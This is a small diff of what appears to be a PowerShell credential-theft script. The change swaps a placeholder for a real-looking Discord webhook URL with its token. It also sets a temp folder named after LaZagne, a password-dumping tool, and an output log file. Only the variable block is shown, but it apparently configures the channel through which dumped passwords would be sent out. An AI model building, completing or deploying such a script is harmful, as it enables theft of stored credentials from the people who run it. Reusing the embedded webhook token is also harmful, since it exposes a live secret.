@@ -1,5 +1,5 @@
 # Define variables
-$webhook = "YourDiscordWebhookURL"
+$webhook = "https://discord.com/api/webhooks/1237789574537810121/W_2CZivcnqxnt2gJuBj1eTf9w_8J7Wqvqs2pdjafWCXF4Yfu7w-DWjhRCW1Aaq0LQ7tn"
 $version = "2.4.6"
 $tempDir = "$env:TEMP\LaZagne"
 $logFile = "$tempDir\output.txt"
